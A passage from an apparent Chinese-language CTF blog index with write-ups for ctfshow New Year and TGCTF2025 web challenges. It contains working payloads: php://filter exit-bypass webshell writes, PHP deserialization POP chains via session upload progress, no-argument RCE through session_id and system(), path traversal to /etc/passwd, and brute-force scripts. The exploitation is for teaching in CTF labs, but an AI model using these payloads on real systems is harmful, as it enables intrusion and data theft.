phpinfo();?>`base64编码后为`aPD9waHAgcGhwaW5mbygpOz8+`，至于为什么前面要加个`a`，是因为base64解码以4个字节为1组转换为3个字节，前面的`<?php exit();`符合base64编码的只有`phpexit`这7个字节，因此添加一个字节来满足编码\n\n#### rot13编码绕过\n\n```\nfilename=php://filter/convert.string.rot13/resource=shell.php\ncontent=<?cuc cucvasb();?>\n```\n\n#### 过滤器嵌套绕过\n\n一种payload\n\n```\nfilename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php\ncontent=?>PD9waHAgcGhwaW5mbygpOz8+\n```\n\n`string.strip_tags`可以过滤掉html标签和php标签里的内容，然后再进行base64解码\n\n## 第二种\n\n第二种情况也就是我们题目中的\n\n```\nfile_put_contents($content,\"<?php exit();\".$content);\n```\n\n#### rot13编码绕过\n\n首先我们要了解一下rot13加密\n\n![image-20250131235820576](../image/achieve/202411/新春欢乐赛/image-20250131235820576.png)\n\n了解了rot13转换之后，我们可以想到，他只会把字母替换，而其他的数字、符号不受影响\n那么我们就可以这样来想，破坏掉`exit`来插入我们想要执行的语句\n\n例如我们想构造phpinfo\n\npayload:\n\n```\n<?cuc cucvasb();?>为<?php phpinfo();?>的rot13加密转化\n```\n\n那我们试着传入这个文件\n\n```\ncontent=php://filter/write=string.rot13|<?cuc cucvasb();?>|/resource=shell.php\n```\n\n- **`php://filter`**: 这是 PHP 提供的一种流过滤器，可以对输入流进行处理。\n\n- **`write=string.rot13`**:这是一个写过滤器，表示对数据进行 ROT13 加密。\n\n- **`/resource=shell.php`**: 这是指定的资源文件，可能是一个 PHP 文件。\n\n然后我们访问shell.php可以看到成功执行了\n\n![image-20250201000208526](../image/achieve/202411/新春欢乐赛/image-20250201000208526-1738339332131-5.png)\n\n说明我们的exit是已经被破坏掉了，这时候我们写入一句话木马\n\n```\n?content=php://filter/write=string.rot13|<?cuc @riny($_CBFG[cmd]);?>|/resource=shell.php\n```\n\n注意这个密码cmd不是我们的密码，而是rot13加密后的密码，所以这个密码正确的应该是pzq(一直以为是我马子没写进去，疯狂传马，后面才意识到这个问题)\n\n![image-20250201002624053](../image/achieve/202411/新春欢乐赛/image-20250201002624053-1738340786006-7.png)\n\n看到自己写了这么多马，笑死了\n\n# web2\n\n## #变量覆盖\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-01-16 15:42:02\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-01-24 22:14:02\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\nhighlight_file(__FILE__);\nsession_start();\nerror_reporting(0);\n\ninclude \"flag.php\";\n\nif(count($_POST)===1){\n        extract($_POST);\n        if (call_user_func($$$$$${key($_POST)})===\"HappyNewYear\"){\n                echo $flag;\n        }\n}\n?>\n```\n\n首先关注的是call_user_func()那句话，如果这个函数存在并返回的结果是字符串，但是我们还是需要重点了解语句里面的`$$$$$${key($_POST)}`\n\n我们先举一个简单的例子\n\n![image-20250202170304506](../image/achieve/202411/新春欢乐赛/image-20250202170304506-1738486988529-1.png)\n\n可以看到经过这个变量的多层覆盖，最终可以实现正常的运行结果\n\n这里要求call_user_func执行 post第一个参数的返回值为Happynewyear，但是这里call_user_func会把参数当作函数来执行，同时只有这一个函数，因此我们需要一个无参数函数返回值为 Happynewyear\n\n一开始想着post传入HappyNewYear=a然后get传入a=HappyNewYear去进行变量覆盖的但是没打通,忘记这里是有一个call_user_func函数了\n\n观察题目发现有一句session_start(); ，这里我们可以用session_id函数 ，他会返回PHPSESSID的值，我们设定PHPSESSID为Happynewyear\n\n![image-20250202172335064](../image/achieve/202411/新春欢乐赛/image-20250202172335064-1738488216562-7.png)\n\n# web3\n\n## #返回true的无参数函数\n\n```php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\ninclude \"flag.php\";\n$key=  call_user_func(($_GET[1]));\n\nif($key==\"HappyNewYear\"){\n  echo $flag;\n}\n\ndie(\"虎年大吉，新春快乐！\");\n\n虎年大吉，新春快乐！\n```\n\n这里的话是一个弱比较的绕过，只要让判断结果为true就可以了，我们可以传入session_start\n\n**session_start()函数 —** **启动新会话或者重用现有会话**\n\n**成功开始会话返回 true ，反之返回 false**\n\n当然这里不只是可以用session_start，那种返回值是true的无参数函数基本上也都可以用\n\n![image-20250202173408231](../image/achieve/202411/新春欢乐赛/image-20250202173408231.png)\n\n# web4\n\n## #返回后缀名的函数\n\n```php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\n$key=  call_user_func(($_GET[1]));\nfile_put_contents($key, \"<?php eval(\\$_POST[1]);?>\");\n\ndie(\"虎年大吉，新春快乐！\");\n\n虎年大吉，新春快乐！\n```\n\n`file_put_contents()`用于将数据内容写入文件，第一个参数就是传入文件的名字或者文件路径，而第二个参数就是我们的文件内容\n\n文件内容是一句话木马，那么我们需要传入一个参数是可以返回我们的文件路径或者文件名的\n\n一开始是使用的getcwd()函数去返回当前的目录，但是考虑到没有具体的文件名可以写不进去，所以后面查了一下可以用spl_autoload_extensions()函数\n\n![image-20250203110917269](../image/achieve/202411/新春欢乐赛/image-20250203110917269.png)\n\n![image-20250203111403687](../image/achieve/202411/新春欢乐赛/image-20250203111403687-1738552445715-11.png)\n\n可以看到这里默认的扩展名是.inc,.php\n\n然后我们传入spl_autoload_extensions，然后访问后可以用蚁剑连接也可以进行传参rce\n\n# web5\n\n## #使用内存溢出绕过file_put_contents机制\n\n```php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n\ninclude \"🐯🐯.php\";\nfile_put_contents(\"🐯\", $flag);\n$🐯 = str_replace(\"hu\", \"🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯\", $_POST['🐯']);\nfile_put_contents(\"🐯\", $🐯);\n```\n\n如果 `filename` 不存在，将会创建文件。反之，存在的文件将会重写。\n\n在使用file_put_contents()函数的时候PHP 需要分配额外的内存来存储结果。如果结果字符串的总大小超过了 PHP 的内存限制，就会导致内存溢出。\n\n而我们是要直接下载🐯去读取flag的，所以这里可以传入一大堆hu来让php报错，导致🐯文件不被覆盖，然后访问🐯下载即可\n\n注意这里hu太多会导致上传失败提示文件过大，hu过少会导致php不报错，具体来说传入524280个hu即可\n\n写个脚本吧\n\n```python\nimport requests\nurl=\"http://63b4e936-07a0-43fc-a8ac-1cff415e6815.challenge.ctf.show/\"\ndata={\n    \"🐯\" : 524280*\"hu\"\n}\nr=requests.post(url,data=data)\nprint(r.text)\n```\n\n然后我们访问下载文件🐯就可以拿到flag了\n\n# web6\n\n## #字符串逃逸\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$function = $_GET['POST'];\nfunction filter($img){\n    $filter_arr = array('ctfshow','daniu','happyhuyear');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}//正则匹配\nif($_SESSION){\n    unset($_SESSION);\n}//清空session会话内容\n$_SESSION['function'] = $function;\nextract($_POST['GET']);\n$_SESSION['file'] = base64_encode(\"/root/flag\");\n$serialize_info = filter(serialize($_SESSION));\nif($function == 'GET'){\n    $userinfo = unserialize($serialize_info);\n    //出题人已经拿过flag，题目正常,也就是说...\n    echo file_get_contents(base64_decode($userinfo['file']));\n}\n```\n\n先审代码\n\n1.首先通过get获取一个值给$function变量\n\n2.一个filter过滤函数的声明\n\n3.unset()函数会清空session会话\n\n4.将 $_function的值赋给 $_SESSION[‘function’]\n\n5.通过post表单提交一个值给get参数并作为数组把键和值提取出来\n\n6.设置session会话中file的值\n\n7.使用filter过滤函数过滤后序列化session会话的数据并将结果赋值给$serialize_info\n\n8.如果function的值为\"GET\"就反序列化serialize_info 并赋值给 $userinfo\n\n9.使用`file_get_contents(base64_decode($userinfo['file']))` 将读取指定路径（`/root/flag`）的文件内容并输出。\n\n所以这里的话我们get传参POST的值显而易见是需要设置为GET的，而关键就在于我们post传参的数组怎么设置了\n\n这里的话考的是一个反序列化的字符串逃逸，因为这里题目注释里头提示出题人已经拿过flag了，所以我们可以在日志里面进行查看出题人的访问日志\n\n我们先看一下服务器的版本是nginx/1.20.1，那nginx的成功日志的文件目录一般就是/var/log/nginx/access.log，，base64编码后是L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==而我们题目中的目录是/root/flag，base64编码后是`L3Jvb3QvZmxhZw==`，filter过滤函数是字符串减少的\n\n所以我们的exp就是\n\n```\n原来题中的$serialize_info为\na:2:{s:8:\"function\";N;s:4:\"file\";s:16:\"L3Jvb3QvZmxhZw==\";}\n我们的payload\nGET[_SESSION][ctfshowdaniu]=s:1:\";s:1:\"1\";s:4:\"file\";s:36:\"L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==\";}\n因为是extract($_POST['GET']);，我们需要POST一个数组GET[_SESSION][ctfshowdaniu],这样传进去就可以得到$_SESSION数组变量，ctfshowdaniu是数组变量中的一个键。\n```\n\n所以原来我们的session数组为\n\n{\n\n\"function\"=>NULL\n\n\"file\"=>L3Jvb3QvZmxhZw==\n\n}\n\n传入后值覆盖\n\n{\n\n“ctfshowdaniu”=>s:1:\";s:1:“1”;s:4:“file”;s:36:“L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==”;}\n\n“file”=>L3Jvb3QvZmxhZw==\n\n}\n\n序列化后的结果是\n\na:2:{s:12:\"ctfshowdaniu\";`s:70:\"s:1:\";s:1:“1”;s:4:“file”;s:36:“L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==”;}\"`;s:4:\"file\";s:16:\"L3Jvb3QvZmxhZw==\";}\n\n这里有人会问为什么我们要传入ctfshowdaniu？这里是为了利用filter函数中的`str_replace`替换成空，变成字符串减少的字符串逃逸。\n\n经过filter过滤后变成\n\na:2:{s:12:\"`\";s:70:\"s:1:`\";s:1:“1”;s:4:“file”;s:36:“L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==”;}\";s:4:\"file\";s:16:\"L3Jvb3QvZmxhZw==\";}\n\n`ctfshowdaniu`刚好12个字符，替换成空后，需要12个字符来填充`\";s:70:\"s:1:`刚好12个字符，所以反序列化后的结果是\n\n{\n\n\"\";`s:70:\"s:1:\"=>\"1\"\n\n\"file\"=>\"L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==\"\n\n}\n\n这样就达到一个字符的逃逸，让后面的`s:4:\"file\";s:16:\"L3Jvb3QvZmxhZw==\";`不起作用了。\n\n成功进行变量覆盖，可以看到日志文件\n\n![image-20250216222140948](../image/achieve/202411/新春欢乐赛/image-20250216222140948.png)\n\n可以看到在我们传入?POST=GET之前是有访问了/ctfshow这个目录的，那我们换成/ctfshow就可以了\n\n但是一开始访问没出来结果，猜测是在本地的目录中的/ctfshow需要进行ssrf，所以设置成`http://127.0.0.1/ctfshow`\n\npayload\n\n```\nget传入?POST=GET\npost传入GET[_SESSION][ctfshowdaniu]=s:1:\";s:1:\"1\";s:4:\"file\";s:32:\"aHR0cDovLzEyNy4wLjAuMS9jdGZzaG93\";}\n```\n\n就可以拿到flag了\n\n# web7\n\n## #session反序列化\n\n```php\n<?php\ninclude(\"class.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\nini_set(\"session.serialize_handler\", \"php\");\nsession_start();\n\nif (isset($_GET['phpinfo']))\n{\n    phpinfo();\n}\nif (isset($_GET['source']))\n{\n    highlight_file(\"class.php\");\n}\n\n$happy=new Happy();\n$happy();\n?>\nHappy_New_Year!!!\n```\n\n先传入source看一下class.php\n\n```php\n<?php\n    class Happy {\n        public $happy;\n        function __construct(){\n                $this->happy=\"Happy_New_Year!!!\";\n        }\n        function __destruct(){\n                $this->happy->happy;\n        }\n        public function __call($funName, $arguments){//当调用对象中不存在的方法会自动调用该方法\n                die($this->happy->$funName);\n        }\n        public function __set($key,$value)//将数据写入不可访问或者不存在的属性\n        {\n            $this->happy->$key = $value;\n        }\n        public function __invoke()//当你尝试将一个对象像函数一样调用时，__invoke() 会被触发。\n        {\n            echo $this->happy;\n        }\n    }\n    class _New_{\n        public $daniu;\n        public $robot;\n        public $notrobot;\n        private $_New_;\n        function __construct(){\n                $this->daniu=\"I'm daniu.\";\n                $this->robot=\"I'm robot.\";\n                $this->notrobot=\"I'm not a robot.\";\n        }\n        public function __call($funName, $arguments){//当调用对象中不存在的方法会自动调用该方法\n                echo $this->daniu.$funName.\"not exists!!!\";\n        }\n        public function __invoke()//当你尝试将一个对象像函数一样调用时，__invoke() 会被触发\n        {\n            echo $this->daniu;\n            $this->daniu=$this->robot;\n            echo $this->daniu;\n        }\n        public function __toString()//当一个对象被当作一个字符串被调用\n        {\n            $robot=$this->robot;\n            $this->daniu->$robot=$this->notrobot;\n            return (string)$this->daniu;\n        }\n        public function __get($key){//读取不可访问或者是不存在的属性时触发\n               echo $this->daniu.$key.\"not exists!!!\";\n        }\n\n }\n    class Year{\n        public $zodiac;\n         public function __invoke()//当你尝试将一个对象像函数一样调用时，__invoke() 会被触发。\n        {\n            echo \"happy \".$this->zodiac.\" year!\";\n        }\n         function __construct(){\n                $this->zodiac=\"Hu\";\n        }\n        public function __toString()//当一个对象被当作一个字符串被调用\n        {\n                $this->show();\n        }\n        public function __set($key,$value)#//将数据写入不可访问或者不存在的属性\n        {\n            $this->$key = $value;\n        }\n        public function show(){\n            die(file_get_contents($this->zodiac));\n        }\n        public function __wakeup()\n        {\n            $this->zodiac = 'hu';\n        }\n    }\n?>\n```\n\n如果单从Happy类中看的话是并没有发现什么危险函数可以用的，但是我们可以从Year类中看到一个file_get_contents()函数，那我们试着写一下链子\n\n`Happy:__destruct()=>_New_:__get()=>_New_:__toString()=>Year:__toString()=>Year:Show()`\n\n但是这里的话可以看到在源码中没有什么可用的参数去进行反序列化的操作，猜测可能是通过session反序列化去进行，当会话开始时，session_start()即会话开始时，会触发回调函数read()，该函数会返回会话数据，php会自动反序列化数据\n\n我们传入一个phpinfo参数看看\n\n![image-20250217200805741](../image/achieve/202411/新春欢乐赛/image-20250217200805741.png)\n\n可以看到脚本利用的反序列化引擎是php，而php.ini默认使用的引擎是php_serialize，这里引擎不一样，也就说明可能可以触发反序列化攻击了\n\n然后我们知道php:存储方式是，键名+竖线+经过serialize()函数序列处理的值，\n\n在phpinfo中可以发现，`session.upload_progress.enabled`为on，`session.upload_progress.cleanup`为off\n\n什么意思呢?`session.upload_progress.enabled`为on意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中。`session.upload_progress.cleanup`为off意味着这些信息保存之后不会被清除掉，所以这道题我们是不需要打条件竞争的\n\n编写我们的exp\n\n```php\n<?php\n//`Happy:__destruct()=>_New_:__get()=>_New_:__toString()=>Year:__toString()=>Year:Show()`\nclass Happy {\n    public $happy;\n}\n\nclass _New_{\n    public $daniu;\n    public $robot;\n    public $notrobot;\n\n}\nclass Year{\n    public $zodiac;\n\n}\n\n$a=new Happy();//实例化Happy对象\n$a->happy=new _New_();//对象调用摧毁时会触发__destruct,将happy赋值为一个新的__New__对象访问happy属性,触发new的get方法\n$a->happy->daniu=new _New_();//echo语句把对象当作字符串输出，将daniu赋值为一个新的__New__对象,触发tostring方法\n$a->happy->daniu->daniu=new Year();//将daniu赋值为一个新的Year对象，（string）转换，就是将对象当作字符串，触发year的tostring方法，然后到show方法。\n$a->happy->daniu->robot=\"zodiac\";//在__New__的__toString方法中会访问daniu中的$robot属性,所以让robot的值为Year中的属性zodiac，从而访问到zodiac属性\n$a->happy->daniu->notrobot=\"/etc/passwd\";//将访问的zodiac属性赋值为/etc/passwd\necho serialize($a);\n?>\n//O:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":3:{s:5:\"daniu\";O:5:\"_New_\":3:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";N;}s:5:\"robot\";s:6:\"zodiac\";s:8:\"notrobot\";s:11:\"/etc/passwd\";}s:5:\"robot\";N;s:8:\"notrobot\";N;}}\n```\n\n构造完成后，这个时候我们需要从浏览器向服务器上传PHP_SESSION_UPLOAD_PROGRESS。\n\n写个post上传表单的口子\n\n```html\n<form action=\"http://c4ba91f7-93a1-4cfb-a221-4dea7835e458.challenge.ctf.show/\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name='PHP_SESSION_UPLOAD_PROGRESS' value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" />\n</form>\n```\n\n然后把我们序列化后的内容传入到file的值中\n\n```\nO:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":3:{s:5:\"daniu\";O:5:\"_New_\":3:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";N;}s:5:\"robot\";s:6:\"zodiac\";s:8:\"notrobot\";s:11:\"/etc/passwd\";}s:5:\"robot\";N;s:8:\"notrobot\";N;}}\n```\n\n然后这里需要将双引号进行转义或者把filename的内容用单引号包裹，然后前面加个|符号，因为当前脚本的序列化引擎是php\n\n```\nO:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":3:{s:5:\"daniu\";O:5:\"_New_\":3:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";N;}s:5:\"robot\";s:6:\"zodiac\";s:8:\"notrobot\";s:11:\"/etc/passwd\";}s:5:\"robot\";N;s:8:\"notrobot\";N;}}\n```\n\n一开始构造的请求发送过去没打出来，后面发现需要设置Cookie，设置之后再发包，\n\n![image-20250417200519025](../image/achieve/202411/新春欢乐赛/image-20250417200519025.png)\n\n成功读到文件，但是我试了一下php://input伪协议用不了，我们也不知道flag具体在哪，环境变量也没有，尝试爆破一下/proc/{pid}/cmdline\n\n`/proc/[pid]/cmdline` 是 Linux 系统 **`/proc` 文件系统**中的一个特殊文件，用于存储 **进程启动时的完整命令行参数**。\n\n写个脚本去爆破吧\n\n```python\nimport requests\n\nurl = \"http://c4ba91f7-93a1-4cfb-a221-4dea7835e458.challenge.ctf.show/\"\nfor i in range(999):\n    payload = '/proc/'+str(i)+'/cmdline'\n    print(payload)\n    data = '''------WebKitFormBoundaryPzA2hRE791H0AVst\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\n123\n------WebKitFormBoundaryPzA2hRE791H0AVst\nContent-Disposition: form-data; name=\"file\"; filename='|O:5:\"Happy\":1:{s:5:\"happy\";O:5:\"_New_\":3:{s:5:\"daniu\";O:5:\"_New_\":3:{s:5:\"daniu\";O:4:\"Year\":1:{s:6:\"zodiac\";N;}s:5:\"robot\";s:6:\"zodiac\";s:8:\"notrobot\";s:'''+str(len(payload))+''':\"'''+payload+'''\";}s:5:\"robot\";N;s:8:\"notrobot\";N;}}'\nContent-Type: text/plain\n\n123\n------WebKitFormBoundaryPzA2hRE791H0AVst--'''\n    r = requests.post(url=url, data=data,headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryPzA2hRE791H0AVst','Cookie': 'PHPSESSID=37eb994d315b99e58c34574c2597b737'})\n    r = r.text.encode()[1990:]\n    print(r)\n\n```\n\n为什么是1990，因为原先的响应内容的长度就是1990\n\n![image-20250417202622078](../image/achieve/202411/新春欢乐赛/image-20250417202622078.png)\n\n然后发现`python3 /app/server.py`命令\n\n尝试读取\n\n```python\nimport os\n\napp = Flask(__name__)\nflag=open('/flag','r')\n#flag我删了\nos.remove('/flag')\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    return \"flag我删了，你们别找了\"\n\n@app.route('/download/', methods=['GET', 'POST'])\ndef download_file():\n    return send_file(request.args['filename'])\n\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=5000, debug=False)\n```\n\nflag被删了，但文件删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，也就是`/proc/self/fd/`,通过这个我们即可得到被删除文件的内容\n\n```\n/download?filename=/proc/self/fd/3\n```\n\n","tags":["新春欢乐赛"],"categories":["ctfshow"]},{"title":"TGCTF2025","url":"/2025/04/16/TGCTF2025/","content":"\n# AAA偷渡阴平\n\n## #请求头无参数RCE\n\n```php\n<?php\n\n\n$tgctf2025=$_GET['tgctf2025'];\n\nif(!preg_match(\"/0|1|[3-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\/i\", $tgctf2025)){\n    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi\n    eval($tgctf2025);\n}\nelse{\n    die('(╯‵□′)╯炸弹！•••*～●');\n}\n\nhighlight_file(__FILE__);\n```\n\n无参数RCE\n\n先看看能不能查看当前目录\n\n```\n?tgctf2025=var_dump(current(localeconv()));//返回小数点\n?tgctf2025=var_dump(scandir(current(localeconv()));//返回当前目录\n?tgctf2025=var_dump(scandir(next(scandir(current(localeconv())))));//返回上级目录\n```\n\n测出来flag在根目录，但是好像访问不了\n\n```\n?tgctf2025=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));//查看根目录文件名\n?tgctf2025=highlight_file(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));\n```\n\n![image-20250412094433097](../image/achieve/202411/TGCTF/image-20250412094433097.png)\n\n换成用请求头去做吧，设置一个Leno请求头在第一位，然后我们使用getallheaders函数并打印出请求头\n\n![image-20250412095258140](../image/achieve/202411/TGCTF/image-20250412095258140.png)\n\n可以看到设置的请求头在第一位，然后用pos取出第一位并在该请求头写入eval执行的代码就行\n\n![image-20250412095355862](../image/achieve/202411/TGCTF/image-20250412095355862.png)\n\n![image-20250412095004478](../image/achieve/202411/TGCTF/image-20250412095004478.png)\n\n# **AAA偷渡阴平（复仇）**\n\n## #session无参数RCE\n\n```php\n<?php\n\n\n$tgctf2025=$_GET['tgctf2025'];\n\nif(!preg_match(\"/0|1|[3-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i\", $tgctf2025)){\n    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi\n    eval($tgctf2025);\n}\nelse{\n    die('(╯‵□′)╯炸弹！•••*～●');\n}\n\nhighlight_file(__FILE__);\n```\n\n其实禁用了这么多，就是把常规的读文件和请求头RCE给禁用了，但是这里session去打无参数RCE是没禁用的，但是其实这里有点复杂，eval函数等一些关键函数都被禁用了，但是我们根据eval函数的特性，可以用分号传入多条语句\n\n```php\n<?php\n$a = 'echo 1;echo 2;';\neval($a);\n//12\n```\n\n所以我们传入\n\n```\n?tgctf2025=session_start();system(session_id());\n```\n\n然后设置cookie\n\n```\nCookie: PHPSESSID=whoami;\n```\n\n页面成功返回执行结果，但是在 HTTP Cookie 中，`PHPSESSID`（或其他 Cookie 值）**不能包含空格**，因为空格在 Cookie 规范中属于**非法字符**，可能导致解析错误，所以ls /是不行的，尝试换成编码，可以用16进制\n\n![image-20250416183744786](../image/achieve/202411/TGCTF/image-20250416183744786.png)\n\n需要注意的是并非所有编码都是可以的\n\nCookie 的名称（Name）和值（Value）只能包含以下字符：\n\n```\n复制字母（A-Za-z）、数字（0-9）、连字符（-）、下划线（_）、点（.）\n```\n\n**空格、分号（;）、逗号（,）、等号（=）等字符是明确禁止的**，因为它们用于分隔 Cookie 字段（如 `Cookie: name=value; name2=value2`）。\n\n# 火眼辩魑魅\n\n## #一句话木马\n\n![image-20250412095544137](../image/achieve/202411/TGCTF/image-20250412095544137.png)\n\n没啥信息，先扫一下目录吧\n\n```\n[09:55:38] Scanning:\n[09:55:54] 301 -   162B - /css  ->  http://node1.tgctf.woooo.tech/css/\n[09:55:58] 200 -   725B - /index.php\n[09:56:04] 200 -   148B - /robots.txt\n[09:56:08] 301 -   162B - /uploads  ->  http://node1.tgctf.woooo.tech/uploads/\n[09:56:08] 403 -   548B - /uploads/\n```\n\n访问/robots.txt\n\n![image-20250412095714970](../image/achieve/202411/TGCTF/image-20250412095714970.png)\n\n简单看了一圈之后发现第二个就是一句话\n\n![image-20250412100431257](../image/achieve/202411/TGCTF/image-20250412100431257.png)\n\n我一开始真以为要一个个测来着，现在蚁剑直接连就行\n\n# 直面天命\n\n## #任意文件读取\n\n源代码有个hint，提示有个路由是四个小写字母组成的，写了个生成字典的脚本\n\n```python\nimport itertools\nwith open('4letters.txt', 'w') as f:\n    for combo in itertools.product('abcdefghijklmnopqrstuvwxyz', repeat=4):\n        f.write(''.join(combo) + '\\n')\n```\n\n爆出来是aazz，访问拿到路由\n\n![image-20250412105936424](../image/achieve/202411/TGCTF/image-20250412105936424.png)\n\n![image-20250412110024303](../image/achieve/202411/TGCTF/image-20250412110024303.png)\n\n参数未知，用Arjun工具探测一下或者用参数名字典爆破一下\n\n![image-20250412111036374](../image/achieve/202411/TGCTF/image-20250412111036374.png)\n\n估计是任意文件读取\n\n```\n?filename=../../../etc/passwd\n```\n\n成功返回信息，然后看版本是Werkzeug/3.0.6 Python/3.8.1，估计又有什么app.py\n\n刚好昨天做了商丘的一道题，语言和环境很像，直接读都行\n\n```\n?filename=../../app.py\n```\n\n![image-20250412111215682](../image/achieve/202411/TGCTF/image-20250412111215682.png)\n\n```python\nimport os import string from flask import Flask, request, render_template_string, jsonify, send_from_directory \nfrom a.b.c.d.secret \nimport secret_key \napp = Flask(__name__)\nblack_list=['{','}','popen','os','import','eval','_','system','read','base','globals'] \ndef waf(name): \n    for x in black_list: \n        if x in name.lower(): \n            return True return False def is_typable(char): # 定义可通过标准 QWERTY 键盘输入的字符集 typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars @app.route('/') def home(): return send_from_directory('static', 'index.html') @app.route('/jingu', methods=['POST']) def greet(): template1=\"\" template2=\"\" name = request.form.get('name') template = f'{name}' if waf(name): template = '想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹\n            else: k=0 \n            for i in name: \n                if is_typable(i): \n                    continue k=1 \n                    break \n                    if k==1: \n                        if not (secret_key[:2] in name and secret_key[2:]): \n                            template = '连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧再去西行历练历练\n                            return render_template_string(template) template1 = \"“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”\n                        最后，如果你用了cat，就可以见到齐天大圣了\n                        template= template.replace(\"直面\",\"{{\").replace(\"天命\",\"}}\") template = template if \"cat\" in template: template2 = '\n或许你这只叫天命人的猴子，真的能做到？\n\nImage' try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f\"500报错了，查询语句如下：\n{template}\" return error_message, 400 @app.route('/hint', methods=['GET']) def hinter(): template=\"hint：\n有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!\" return render_template_string(template) @app.route('/aazz', methods=['GET']) def finder(): filename = request.args.get('filename', '') if filename == \"\": return send_from_directory('static', 'file.html') if not filename.replace('_', '').isalnum(): content = jsonify({'error': '只允许字母和数字！'}), 400 if os.path.isfile(filename): try: with open(filename, 'r') as file: content = file.read() return content except Exception as e: return jsonify({'error': str(e)}), 500 else: return jsonify({'error': '路径不存在或者路径非法'}), 404 if __name__ == '__main__': app.run(host='0.0.0.0', port=80)\n```\n\n让ai梳理了一下\n\n## #ssti\n\n```python\nimport os\nimport string\nfrom flask import Flask, request, render_template_string, jsonify, send_from_directory\nfrom a.b.c.d.secret import secret_key\n\napp = Flask(__name__)\nblack_list = ['{', '}', 'popen', 'os', 'import', 'eval', '_', 'system', 'read', 'base', 'globals']\n\ndef waf(name):\n    for x in black_list:\n        if x in name.lower():\n            return True\n    return False\n\ndef is_typable(char):\n    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace\n    return char in typable_chars\n\n@app.route('/')\ndef home():\n    return send_from_directory('static', 'index.html')\n\n@app.route('/jingu', methods=['POST'])\ndef greet():\n    template1 = \"\"\n    template2 = \"\"\n    name = request.form.get('name')\n    template = f'{name}'\n\n    if waf(name):\n        template = '想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹\\nImage'\n    else:\n        k = 0\n        for i in name:\n            if is_typable(i):#检测是不是可打印字符\n                continue\n            k = 1\n            break\n\n        if k == 1:#如果不是可打印字符\n            if not (secret_key[:2] in name and secret_key[2:]):\n                template = '连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧\\n\\n再去西行历练历练\\nImage'\n            return render_template_string(template)\n\n    template1 = \"“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”\\n最后，如果你用了cat，就可以见到齐天大圣了\\n\"\n    template = template.replace(\"直面\", \"{{\").replace(\"天命\", \"}}\")\n\n    if \"cat\" in template:\n        template2 = '\\n或许你这只叫天命人的猴子，真的能做到？\\nImage'\n\n    try:\n        return template1 + render_template_string(template) + render_template_string(template2)\n    except Exception as e:\n        error_message = f\"500报错了，查询语句如下：\\n{template}\"\n        return error_message, 400\n\n@app.route('/hint', methods=['GET'])\ndef hinter():\n    template = \"hint：\\n有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!\"\n    return render_template_string(template)\n\n@app.route('/aazz', methods=['GET'])\ndef finder():\n    filename = request.args.get('filename', '')\n    if filename == \"\":\n        return 